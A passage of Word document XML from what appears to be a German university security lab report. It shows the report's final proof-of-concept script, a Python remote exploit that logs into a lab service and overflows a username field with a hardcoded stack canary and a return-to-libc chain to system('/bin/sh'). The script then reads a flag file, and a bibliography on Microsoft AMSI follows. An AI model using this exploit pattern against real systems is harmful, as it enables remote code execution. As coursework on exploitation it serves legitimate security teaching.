    <w:p w14:paraId="2DB5F83F" w14:textId="39016114" w:rsidR="000D009F" w:rsidRDefault="000D009F" w:rsidP="002B1549">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04F60E17" w14:textId="09BCEA3A" w:rsidR="000D009F" w:rsidRDefault="000D009F" w:rsidP="002B1549">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="000B7A2F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>er schlussendliche PoC ist nochmals als Lese</w:t>
      </w:r>
      <w:r w:rsidR="002B126F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>unterstützung</w:t>
      </w:r>
      <w:r w:rsidR="000B7A2F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002B126F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in folgender Tabelle ersichtlich:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F726D24" w14:textId="53D1CF26" w:rsidR="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B1549">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="002B126F" w:rsidRPr="002B126F" w14:paraId="046B7997" w14:textId="77777777" w:rsidTr="002B126F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57BA96FC" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import struct</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C3F18EA" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BAB9AE8" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import time</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51627E36" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4A90C5D8" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>canaries = '\xBC\xAD\xB8\xA8'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F02BC59" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>fillerNopSleds = '\x90' * 20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="170063BF" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>login = 'cs19m050:cs19m050' + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04FF5FD2" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>libcBase = int("0xB75b3000", 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="540BAF10" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#cmd = 'ls -l'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F47E65B" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>cmd = 'cat cs19m050_flag.txt'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="645D2053" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="63AE063D" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>system = libcBase + 0x3ab40</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26323631" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>exit = libcBase + 0x2e7f0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F55BC15" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>binsh = libcBase + 0x15cdc8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="471D5A01" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4C12B340" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>r2libc = struct.pack('&lt;L', system)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="047384C2" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>r2libc += struct.pack('&lt;L', exit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EB8A62B" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>r2libc += struct.pack('&lt;L', binsh)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CCBB974" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5E967E51" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>buffer = 'A' * 128 + canaries + fillerNopSleds + r2libc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E78C7E9" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0A9A115C" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>IP_FH = '10.105.21.174'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5398B67C" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>IP_MARTIN = '10.0.2.22'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="249D9880" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>IP = IP_FH</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CF03E17" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>PORT = 8080</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="378ADF28" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>BUFFER_SIZE = 2048</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="659FE376" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="41E60F37" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># connection establishment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31E299A8" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D2D925A" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>connect = s.connect((IP, PORT))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38547C1C" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1C2A09DA" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># login to the application</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13C8B535" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(login)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15DC70E6" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>res2 = s.recv(BUFFER_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44E3D556" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="737C1D67" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>time.sleep(0.02)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B80FE76" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1EAEF36C" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># sending buffer to change username vulnerability</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38BD4822" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send('u ' + buffer + '\n')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50850848" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>res3 = s.recv(BUFFER_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A9B9A62" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5E7E6E7A" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># sending cmd which should be executed</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33612619" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(cmd + '\n')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30FF5683" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4EA6B9BA" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#response of cmd</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D30021D" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>res4 = s.recv(BUFFER_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65CE01CD" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>print "Response: " + res4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B280BA3" w14:textId="77777777" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3D97D24C" w14:textId="3A5330DA" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="002B126F" w:rsidP="002B126F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002B126F">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.close()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B126F" w:rsidRPr="002B126F" w14:paraId="4E2C4765" w14:textId="77777777" w:rsidTr="002B126F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2A245060" w14:textId="7CABFC56" w:rsidR="002B126F" w:rsidRPr="002B126F" w:rsidRDefault="007F4E02" w:rsidP="002B1549">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="007F4E02">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>poc_pokerrop_canaries_alsr.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="571494C5" w14:textId="77777777" w:rsidR="000D009F" w:rsidRPr="002B126F" w:rsidRDefault="000D009F" w:rsidP="002B1549">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0915F5B4" w14:textId="3F556B18" w:rsidR="00B14D60" w:rsidRPr="002B126F" w:rsidRDefault="00B4338D" w:rsidP="00E67D32">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B126F">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:tag w:val="CitaviBibliography"/>
        <w:id w:val="-1540042400"/>
        <w:placeholder>
          <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
        </w:placeholder>
      </w:sdtPr>
      <w:sdtEndPr/>
      <w:sdtContent>
        <w:p w14:paraId="06B043A7" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRDefault="00EC3E80" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyHeading"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviBibliography</w:instrText>
          </w:r>
          <w:r w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:bookmarkStart w:id="17" w:name="_Toc62994623"/>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>Literatur</w:t>
          </w:r>
          <w:bookmarkEnd w:id="17"/>
        </w:p>
        <w:p w14:paraId="58366F03" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[1]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="18" w:name="_CTVL0014108bbfce44547fd9af68c19fe6f2779"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Microsoft, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="18"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Antimalware Scan Interface (AMSI). </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal (Zugriff am: 30. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="242A02DC" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[2]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="19" w:name="_CTVL001ded9a1671d8b4c92934c806059021637"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Microsoft, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="19"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">How the Antimalware Scan Interface (AMSI) helps you defend against malware. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps (Zugriff am: 30. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="4E993535" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
